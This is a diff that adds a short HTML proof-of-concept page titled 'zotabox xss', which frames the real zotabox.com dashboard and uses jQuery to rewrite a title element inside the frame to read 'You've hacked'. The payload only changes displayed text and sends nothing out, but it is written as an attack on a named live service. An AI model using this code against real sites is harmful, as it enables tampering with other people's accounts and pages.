@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  </head>
+  <body>
+     zotabox xss
+    <script type="text/javascript">
+     var times = 0;
+     function onloadIframe() {
+         times++;
+         if (times > 1) return;
+
+         $(function() {
+             setTimeout(function() {
+                 $('#dash').contents().find('.catleft-title').html("You've hacked");
+             }, 700);
+         });
+     }
+    </script>
+    <iframe id="dash" src="https://zotabox.com/dashboard" width="100%" height="1000px" onload="onloadIframe()"></iframe>
+  </body>
+</html>
